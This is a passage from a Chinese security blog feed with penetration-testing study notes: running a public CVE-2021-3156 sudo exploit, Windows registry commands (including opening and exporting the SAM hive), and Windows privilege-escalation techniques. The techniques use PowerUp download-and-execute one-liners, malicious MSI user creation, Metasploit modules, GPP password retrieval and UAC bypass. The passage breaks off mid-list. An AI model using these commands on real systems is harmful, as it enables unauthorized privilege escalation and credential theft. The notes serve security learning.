class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加用户</span></span><br><span class="line">useradd kali</span><br><span class="line">passwd xxx</span><br><span class="line"><span class="comment"># 设置写权限</span></span><br><span class="line">chmod -v u+w /etc/sudoers</span><br><span class="line">vim /etc/sudoers</span><br><span class="line"><span class="comment"># root下面添加kali</span></span><br><span class="line">rootALL=(ALL) ALL</span><br><span class="line">kaliALL=(ALL) ALL</span><br><span class="line">chmod -v u-w /etc/sudoers</span><br></pre></td></tr></table></figure><p>切换到普通用户然后利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> CVE-2021-3156</span><br><span class="line">make</span><br><span class="line">./sudo-hax-me<span class="_">-a</span>-sandwich 2</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210202101844331.png" alt="image-20210202101844331"></p><p><img src="/imgs/image-20210202101852638.png" alt="image-20210202101852638"></p><p>参考链接：<a href="https://github.com/blasty/CVE-2021-3156" target="_blank" rel="noopener">https://github.com/blasty/CVE-2021-3156</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> sudo提权 </category>
          
          <category> CVE-2021-3156 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sudo提权 </tag>
            
            <tag> CVE-2021-3156 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows注册表学习</title>
      <link href="2021/02/01/Windows%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>2021/02/01/Windows%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>以下是对Windows注册表学习的记录，内容多来自参考链接，这里仅作学习记录和日后查询。</p><h2 id="一、理解注册表"><a href="#一、理解注册表" class="headerlink" title="一、理解注册表"></a>一、理解注册表</h2><p><img src="/imgs/image-20210201145405641.png" alt="image-20210201145405641"></p><h3 id="定义及作用"><a href="#定义及作用" class="headerlink" title="定义及作用"></a>定义及作用</h3><blockquote><p>注册表（Registry，繁体中文版Windows操作系统称之为登录档）是Microsoft Windows中的一个重要的<strong>数据库</strong>，用于存储系统和应用程序的设置信息。</p><p>注册表是 Windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着 Windows的启动、 硬件驱动程序的装载以及一些Windows应用程序的运行，从而在整个系统中起着核心作用。这些作用包括了软、硬件的相关配置和状态信息，比如注册表中保存有应用程序和资源管理器外壳的初始条件、首选项和卸载数据等，联网计算机的整个系统的设置和各种许可，文件扩展名与应用程序的关联， 硬件部件的描述、状态和属性，性能记录和其他底层的系统状态信息，以及其他数据等。</p></blockquote><h3 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h3><p>根据定义可以看出注册表就是一个数据库，那么肯定是有数据结构、类型和存储方式的。</p><p><strong>数据结构:</strong></p><blockquote><p>注册表由键（key，或称“项”）、子键（subkey，子项）和值项（value）构成。</p><p>一个键就是树状数据结构中的一个节点，而子键就是这个节点的子节点，子键也是键。</p><p>一个值项则是一个键的一条<strong>属性</strong>，由名称（name）、<strong>数据类型（datatype）</strong>以及数据（data）组成。</p><p>一个键可以有一个或多个值，每个值的名称各不相同，如果一个值的名称为空，则该值为该键的默认值。</p></blockquote><p>根据上面的理解，那么下图Account可以是一个键，Users是Account的子键，而右侧则是值项。</p><p><img src="/imgs/image-20210201152118963.png" alt="image-20210201152118963"></p><p>注册表的<strong>数据类型</strong>常用的有以下五种：</p><table><thead><tr><th align="left">显示类型</th><th align="left">数据类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">REG_SZ</td><td align="left">字符串</td><td align="left">文本字符串</td></tr><tr><td align="left">REG_BINARY</td><td align="left">二进制数</td><td align="left">不定长度的二进制值，以十六进制显示</td></tr><tr><td align="left">REG_DWORD</td><td align="left">双字</td><td align="left">一个 32 位的二进制值，显示为 8 位的十六进制值</td></tr><tr><td align="left">REG_MULTI_SZ</td><td align="left">多字符串</td><td align="left">含有多个文本值的字符串，此名来源于字符串间用 nul 分隔、结尾两个 nul</td></tr><tr><td align="left">REG_EXPAND_SZ</td><td align="left">可扩充字符串</td><td align="left">含有环境变量的字符串</td></tr></tbody></table><p>注册表的<strong>5大根键</strong>：</p><p>注册表有五个一级分支，也就是根键：</p><table><thead><tr><th align="left">名称</th><th>简称</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">HKEY_CLASSES_ROOT</td><td>HKCR</td><td align="left">存储Windows可识别的文件类型的详细列表，以及相关联的程序。</td></tr><tr><td align="left">HKEY_CURRENT_USER</td><td>HKCU</td><td align="left">存储当前用户设置的信息。</td></tr><tr><td align="left">HKEY_LOCAL_MACHINE</td><td>HKLM</td><td align="left">包括安装在计算机上的硬件和软件的信息。</td></tr><tr><td align="left">HKEY_USERS</td><td>HKU</td><td align="left">包含使用计算机的用户的信息。</td></tr><tr><td align="left">HKEY_CURRENT_CONFIG</td><td>HKCC</td><td align="left">这个分支包含计算机当前的硬件配置信息。</td></tr></tbody></table><p><strong>存储方式：</strong></p><p>在XP及以后注册表都存放于C:\WINDOWS\SYSTEM32\CONFIG。</p><p><img src="/imgs/image-20210201153925476.png" alt="image-20210201153925476"></p><p>在WIN NT操作系统下，计算机配置和缺省用户设置的注册表数据在Win NT中被保存在下面这五个文件中：<br>DEFAULT，SAM，SECURITY，SOFTWARE，SYSTEM，NTUSER.DAT。</p><p>配置单元文件：</p><table><thead><tr><th align="left">名称</th><th align="left">注册表分支</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">SYSTEM</td><td align="left">HKEY_LOCAL_MACHINE\SYSTEM</td><td align="left">存储计算机硬件和系统的信息</td></tr><tr><td align="left">NTUSER.DAT</td><td align="left">HKEY_CURRENT_USER</td><td align="left">存储用户参数选择的信息（此文件放置于用户个人目录，和其他注册表文件是分开的）</td></tr><tr><td align="left">SAM</td><td align="left">HKEY_LOCAL_MACHINE\SAM</td><td align="left">用户及密码的数据库</td></tr><tr><td align="left">SECURITY</td><td align="left">HKEY_LOCAL_MACHINE\SECURITY</td><td align="left">安全性设置信息</td></tr><tr><td align="left">SOFTWARE</td><td align="left">HKEY_LOCAL_MACHINE\SOFTWARE</td><td align="left">安装的软件信息</td></tr><tr><td align="left">DEFAULT</td><td align="left">HKEY_USERS\DEFAULT</td><td align="left">缺省启动用户的信息</td></tr><tr><td align="left">USERDIFF</td><td align="left">HKEY_USERS</td><td align="left">管理员对用户强行进行的设置</td></tr></tbody></table><h2 id="二、注册表的增删改查"><a href="#二、注册表的增删改查" class="headerlink" title="二、注册表的增删改查"></a>二、注册表的增删改查</h2><p>图形界面操作注册表比较简单，不在这里赘述，主要记录下命令行操作，在命令行下操作一般需要以管理员权限打开CMD。</p><h4 id="打开注册表图形界面"><a href="#打开注册表图形界面" class="headerlink" title="打开注册表图形界面"></a>打开注册表图形界面</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regedit</span><br></pre></td></tr></table></figure><h4 id="操作命令："><a href="#操作命令：" class="headerlink" title="操作命令："></a>操作命令：</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; reg -h</span><br><span class="line"></span><br><span class="line">REG QUERY /?</span><br><span class="line">REG ADD /?</span><br><span class="line">REG DELETE /?</span><br><span class="line">REG <span class="built_in">COPY</span> /?</span><br><span class="line">REG SAVE /? </span><br><span class="line">REG <span class="built_in">RESTORE</span> /?</span><br><span class="line">REG LOAD /?</span><br><span class="line">REG UNLOAD /?</span><br><span class="line">REG COMPARE /?</span><br><span class="line">REG EXPORT /?</span><br><span class="line">REG IMPORT /?</span><br><span class="line">REG FLAGS /?</span><br></pre></td></tr></table></figure><h4 id="权限设置："><a href="#权限设置：" class="headerlink" title="权限设置："></a>权限设置：</h4><p>为用户赋予相应权限，可以参考<a href="https://blog.csdn.net/weixin_33826268/article/details/92316569" target="_blank" rel="noopener">Regini修改注册表权限命令</a>：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># [<span class="number">1</span> <span class="number">8</span> <span class="number">17</span>]表示赋予 administrator、everyone、system分别是完全控制、只读、完全控制权限</span><br><span class="line"><span class="built_in">echo</span> HKLM\SAM\SAM\Domains\Account\Users [<span class="number">1</span> <span class="number">8</span> <span class="number">17</span>] &gt;regini.ini</span><br><span class="line">regini regini.ini</span><br></pre></td></tr></table></figure><h4 id="查询注册表项："><a href="#查询注册表项：" class="headerlink" title="查询注册表项："></a>查询注册表项：</h4><p>REG QUERY KeyName [/v [ValueName] | /ve] [/s]<br>          [/f Data [/k] [/d] [/c] [/e]] [/t Type] [/z] [/se Separator]<br>          [/reg:32 | /reg:64]</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 示例：查询administrator用户 注册表项</span><br><span class="line">reg query HKLM\SAM\SAM\Domains\Account\Users\Names\administrator /ve</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210201160101343.png" alt="image-20210201160101343"></p><h4 id="增加或修改-更新注册表项："><a href="#增加或修改-更新注册表项：" class="headerlink" title="增加或修改/更新注册表项："></a>增加或修改/更新注册表项：</h4><p>REG ADD KeyName [/v ValueName | /ve] [/t Type] [/s Separator] [/d Data] [/f]<br>        [/reg:32 | /reg:64]</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 添加注册表项</span><br><span class="line">reg add hkcu\test</span><br><span class="line"># 示例：创建一个注册表项test，并且添加一个值名称为"hello"，类型为"REG_SZ"，数据为"hello! this is test!"</span><br><span class="line">reg add hkcu\test /v hello /t REG_SZ /d "hello! this is test!"</span><br><span class="line"># 示例：修改注册表项的某个值项的数据</span><br><span class="line">reg add hkcu\test /v hello /t REG_SZ /d "hello! this is test222!"</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210201162424093.png" alt="image-20210201162424093"></p><h4 id="删除注册表项："><a href="#删除注册表项：" class="headerlink" title="删除注册表项："></a>删除注册表项：</h4><p>REG DELETE KeyName [/v ValueName | /ve | /va] [/f] [/reg:32 | /reg:64]</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 删除注册表删除hkcu\test下刚才创建的"hello"值</span><br><span class="line">reg delete hkcu\test /v hello /f</span><br><span class="line"># 删除注册表项</span><br><span class="line">reg delete hkcu\test /f</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210201161842280.png" alt="image-20210201161842280"></p><h4 id="导入导出注册表项："><a href="#导入导出注册表项：" class="headerlink" title="导入导出注册表项："></a>导入导出注册表项：</h4><p>可以将注册表导出修改，删除原来的再导入</p><p>导出注册表</p><p>REG EXPORT KeyName FileName [/y] [/reg:32 | /reg:64]</p><p>  Keyname    ROOTKEY[\SubKey] (只是本地机器)。<br>    ROOTKEY  [ HKLM | HKCU | HKCR | HKU | HKCC ]<br>    SubKey   所选 ROOTKEY 下的注册表项的全名。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 导出到本地</span><br><span class="line">reg export HKLM\SAM\SAM\Domains\Account\Users\Names\administrator C:\test.reg</span><br></pre></td></tr></table></figure><p>导入注册表</p><p>REG IMPORT FileName[/reg:32 | /reg:64]</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg import C:\test.reg</span><br></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://blog.csdn.net/haiross/article/details/45890901" target="_blank" rel="noopener">https://blog.csdn.net/haiross/article/details/45890901</a></p><p><a href="https://www.qingsword.com/qing/163.html" target="_blank" rel="noopener">https://www.qingsword.com/qing/163.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
          <category> 注册表 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 注册表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习笔记-Ⅳ：权限提升</title>
      <link href="2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<p>继续学习内网安全，这是第四章以及拓展Linux提权的总结…</p><h2 id="一、Windows提权"><a href="#一、Windows提权" class="headerlink" title="一、Windows提权"></a>一、Windows提权</h2><h3 id="Windows权限"><a href="#Windows权限" class="headerlink" title="Windows权限"></a>Windows权限</h3><p>在windows中，权限大概分为4种，分别是User、Administrator、System、TrustedInstaller。</p><p>User：普通用户权限，是系统中权限最低的用户；</p><p>Administrator：管理员权限，相对来说权限较高。可以利用Windows的机制提权为System，从而操作SAM文件等；</p><p>System：系统权限。可以对SAM等敏感文件进行读取，往往需要将administrator权限提升为system权限才可以对散列值进行Dump操作；</p><p>TrustedInstaller：最高权限，常规使用中不会涉及。System对系统文件无法修改，只有TrustedInstaller才可以。</p><p>Windows操作系统常用的提权方法有：<strong>系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、Web中间件漏洞提权、DLL劫持提权、滥用高权限令牌提权、第三方服务提权等。</strong></p><img src="/imgs/image-20210122194452107.png" alt="image-20210122194452107" style="zoom:50%;" /><h3 id="常见提权方法"><a href="#常见提权方法" class="headerlink" title="常见提权方法"></a>常见提权方法</h3><h4 id="1、内核漏洞提权"><a href="#1、内核漏洞提权" class="headerlink" title="1、内核漏洞提权"></a>1、内核漏洞提权</h4><p>Windows平台提权漏洞合集：<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">windows-kernel-exploits</a></p><h5 id="常用的提权漏洞："><a href="#常用的提权漏洞：" class="headerlink" title="常用的提权漏洞："></a>常用的提权漏洞：</h5><table><thead><tr><th align="left">漏洞代号</th><th align="left">补丁编号</th><th align="left">适用平台</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">MS14-058</td><td align="left">KB3000061</td><td align="left">03，08，12，Win7</td><td align="left">本地提权【CS常用】</td></tr><tr><td align="left">MS14-068</td><td align="left">KB3011780</td><td align="left">域控未安装补丁的域内，03，08，12</td><td align="left">域内提权</td></tr><tr><td align="left">MS15-051</td><td align="left">KB3057191</td><td align="left">03，08，12，Win7</td><td align="left">本地提权</td></tr><tr><td align="left">MS16-032</td><td align="left">KB3143141</td><td align="left">08 r2以后，12，Win7</td><td align="left">本地提权</td></tr><tr><td align="left">MS17-010</td><td align="left">KB4013389</td><td align="left">03，08，12，16，win7</td><td align="left">远程注入dll</td></tr><tr><td align="left">CVE-2018-8120</td><td align="left">KB4131188</td><td align="left">08，win7</td><td align="left">本地提权【MSF常用】</td></tr><tr><td align="left">CVE-2020-1472</td><td align="left"></td><td align="left">08，12，16 ，19</td><td align="left">域内提权</td></tr></tbody></table><h5 id="寻找缺失补丁"><a href="#寻找缺失补丁" class="headerlink" title="寻找缺失补丁"></a>寻找缺失补丁</h5><p>寻找缺失补丁可以利用系统命令、MSF、Windows Exploit Suggester、Powershell的Sherlock脚本和CS的Elevate功能。</p><p>利用系统命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"># 快速比对查找缺失补丁，注意这个要根据实际的系统版本来看。</span><br><span class="line">systeminfo &gt; temp.txt&amp;(<span class="keyword">for</span> %i <span class="keyword">in</span> (KB3000061 KB3011780 KB3057191 KB3143141 KB4013389 KB4131188) <span class="keyword">do</span> @<span class="built_in">type</span> temp.txt|@<span class="built_in">find</span> /i  "%i"|| @<span class="built_in">echo</span> %i <span class="keyword">Not</span> Installed!)&amp;<span class="built_in">del</span> /f /q /a temp.txt</span><br></pre></td></tr></table></figure><p>利用在线查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bugs.hacking8.com&#x2F;tiquan&#x2F;</span><br><span class="line">粘贴补丁号码或者systeminfo来进行查询</span><br></pre></td></tr></table></figure><p>利用MSF：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br><span class="line">set session id</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>利用Windows Exploit Suggester：</p><p>下载地址：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p><p>Windows-Exploit-Suggester通过下载微软公开漏洞库到本地“生成日期+mssb.xls”文件，然后根据操作系统版本，和systeminfo生成的文件进行比对。微软公开漏洞库下载地址：<a href="http://www.microsoft.com/en-gb/download/confirmation.aspx?id=36982。同时此工具还会告知用户针对于此漏洞是否有公开的exp和可用的Metasploit模块。" target="_blank" rel="noopener">http://www.microsoft.com/en-gb/download/confirmation.aspx?id=36982。同时此工具还会告知用户针对于此漏洞是否有公开的exp和可用的Metasploit模块。</a></p><p>利用Powershell Sherlock：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> C:\Sherlock.ps1</span><br><span class="line"><span class="built_in">Find-AllVulns</span></span><br></pre></td></tr></table></figure><h4 id="2、系统配置错误提权"><a href="#2、系统配置错误提权" class="headerlink" title="2、系统配置错误提权"></a>2、系统配置错误提权</h4><p>Windows系统常见的配置错误包括管理员凭据配置错误、服务配置错误、故意削弱的安全措施、用户权限过高等。</p><p>系统配置错误提权有<strong>权限配置错误、注册表键AlwaysInstallElevated、可信任服务路径漏洞、自动安装配置文件、计划任务和Empire内置模块</strong>提权方式。</p><h5 id="系统权限配置错误"><a href="#系统权限配置错误" class="headerlink" title="系统权限配置错误"></a>系统权限配置错误</h5><p>系统权限配置错误有如下两种可能：</p><ul><li>服务未运行：攻击者会使用任意服务替换原来的服务，然后重启服务</li><li>服务正在运行且无法被终止：这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用DLL劫持技术并尝试重启服务来提取</li></ul><p>查找该漏洞有两种利用方式PowerUp和MSF。</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank" rel="noopener">PowerUp</a>利用方式：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以下两种可以检测漏洞服务</span></span><br><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">"&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;"</span></span><br><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Comand</span> <span class="string">"IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1');Invoke-AllChecks"</span></span><br><span class="line"><span class="comment"># 示例，根据上面检测出如果存在OmniServers服务漏洞，利用下面命令添加用户</span></span><br><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-exec</span> bypass IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'C:\PowerUp.ps1'</span>);<span class="built_in">Install-ServiceBinaery</span><span class="literal">-ServiceName</span> <span class="string">'OmniServers'</span> <span class="literal">-UserName</span> user1 <span class="literal">-Password</span> possword1</span><br></pre></td></tr></table></figure><p>MSF利用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</span><br><span class="line">set aggressive true</span><br><span class="line">set session id</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h5 id="注册表键AlwaysInstallElevated提权"><a href="#注册表键AlwaysInstallElevated提权" class="headerlink" title="注册表键AlwaysInstallElevated提权"></a>注册表键AlwaysInstallElevated提权</h5><p>注册表键AlwaysInstallElevated是一个策略设置项，Windows允许低权限用户以System权限运行安装文件，如果启用该策略设置项，呢么任何权限下的用户都能以NT AUTHORITY\SYSTEM权限来安装恶意的MSI（Microsoft Windows Installer）文件。</p><p>漏洞原因：运维人员启用了组策略-计算机配置&amp;用户配置的管理模板-Windows组件-Windows Installer的始终以高权限进行安装。</p><p>Windows Installer是Windows操作系统的组件之一，专门用来管理和安装软件服务。Windows Installer分为客户端安装服务（Msiexec.exe）和MSI文件两部分，Windows Installer通过Msiexec.exe安装MSI文件包含的程序。</p><p><img src="/imgs/image-20210122105856136.png" alt="image-20210122105856136"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 对应注册表项，键值都是1</span><br><span class="line">HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br><span class="line">HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure><p>利用方法：</p><p>可以通过powerup进行利用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行</span></span><br><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-exec</span> bypass IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'C:\PowerUp.ps1'</span>);<span class="built_in">Get-RegistryAlwaysInstallElevated</span></span><br><span class="line"><span class="comment"># 运行Write-UserAddMSI模块生成MSI文件</span></span><br><span class="line"><span class="built_in">Write-UserAddMSI</span></span><br><span class="line"><span class="comment"># 添加用户</span></span><br><span class="line">msiexec /q /i UserAdd.msi</span><br><span class="line"><span class="comment"># 查看</span></span><br><span class="line">net user</span><br></pre></td></tr></table></figure><h5 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h5><p>Windows服务通常以System权限运行，系统在解析文件路径时也会以System权限运行。如果一个服务的可执行文件的路径没有被双引号引起来且包含<strong>空格</strong>，那么这个服务就是有漏洞的。</p><p>比如一个完整的文件路径<code>C:\Program Files\Some Folder\Service.exe</code>，系统会对路径中空格的所有可能情况进行测试，直至找到一个可执行的程序。</p><p>C:\Program.exe</p><p>C:\Program Files\Some.exe</p><p>C:\Program Files\Some Folder\Service.exe</p><p>因此当一个构造过命名的程序被上传到受影响的目录下时，服务一旦被重启，该程序就会以System权限运行。</p><p>通过MSF利用：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 寻找存在漏洞的服务</span><br><span class="line">wmic service get name,displayname,pathname,startmode | <span class="built_in">findstr</span> /i "Auto" | <span class="built_in">findstr</span> /i /v "C:\Windows\\" | <span class="built_in">findstr</span> /i /v """</span><br><span class="line"># msf攻击模块</span><br><span class="line">exploit/windows/local/trusted_service_path</span><br><span class="line"># 正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程</span><br><span class="line"><span class="built_in">set</span> AutoRunScript migrate -f</span><br></pre></td></tr></table></figure><h5 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h5><p>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样，在计划任务下次执行时，就会以以高权限来运行恶意程序。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查看计算机的计划任务</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line"># 查看指定目录的权限配置情况。accesschk是微软官方提供的工具，一般不会引起杀软告警</span><br><span class="line"># accesschk下载地址：http://technet.microsoft.com/ZH-cn/sysinternals/bb664922</span><br><span class="line">accesschk.exe -dqv "D:\test" -accepteula</span><br></pre></td></tr></table></figure><h4 id="3、组策略首选项提权"><a href="#3、组策略首选项提权" class="headerlink" title="3、组策略首选项提权"></a>3、组策略首选项提权</h4><p>sysvol是活动目录的一个用于存储公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制。sysvol文件夹是在安装活动目录时候自动创建的，主要用来存放登录脚本、组策略数据及其他域控需要的域信息。sysvol在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。整个sysvol目录在所有的域控中是自动同步和共享的，所有组策略在：C:\Windows\SYSVOL\domain\Policies中。</p><p> 在一般域环境中所有机器都是脚本化批量部署的，数据量很大，为了方便对所有机器进行操作。网管会使用域策略进行统一的配置和管理，大多数组织在创建域环境后会要求加入域的计算机使用域用户密码进行登录验证。为了保证本地管理员的安全性，这些组织的网络管理员往往会修改本地管理员密码。通过组策略修改密码，若攻击者获得一台机器的本地管理员密码，就相当于获取整个域中所有机器的本地管理员密码。</p><p>常见的组策略首选项（Group Policy Perferences，GPP）：映射驱动器（Drives.xml）、常见本地用户、数据源（DataSources.xml）、打印机配置（Printers.xml）、创建/更新服务（Services.xml）、计划任务（ScheduledTasks.xml）。</p><p>利用方法，只有存在漏洞才可以利用，该漏洞对应补丁KB2962486：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Powershell获取cpassword</span><br><span class="line">Get-GPPPassword.ps1</span><br><span class="line"># Msf</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp</span><br><span class="line"># Empire</span><br><span class="line">usemodule privesc&#x2F;gpp</span><br></pre></td></tr></table></figure><h4 id="4、绕过UAC提权"><a href="#4、绕过UAC提权" class="headerlink" title="4、绕过UAC提权"></a>4、绕过UAC提权</h4><p>uac说明：<a href="https://www.cnblogs.com/Chesky/p/UAC_Bypass.html" target="_blank" rel="noopener">https://www.cnblogs.com/Chesky/p/UAC_Bypass.html</a></p><p>UAC（User Account Control，用户帐户控制）是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。</p><p>UAC需要授权的动作包括：</p><ul><li>配置Windows Update；</li><li>增加或删除用户账户；</li><li>改变用户的账户类型；</li><li>改变UAC设置；</li><li>安装ActiveX；</li><li>安装或移除程序；</li><li>安装设备驱动程序；</li><li>设置家长控制；</li><li>将文件移动或复制到Program Files或Windows目录；</li><li>查看其他用户文件夹等</li></ul><p>利用方法，可参考<a href="https://www.cnblogs.com/backlion/p/10552137.html：" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/10552137.html：</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows权限升级绕过UAC保护-进程注入</span></span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac</span><br><span class="line"><span class="comment"># Windows权限升级绕过UAC保护-内存注入</span></span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_injection</span><br><span class="line"><span class="comment"># 绕过Windows UAC保护（通过FodHelper注册表项）</span></span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_fodhelper</span><br><span class="line"><span class="comment"># 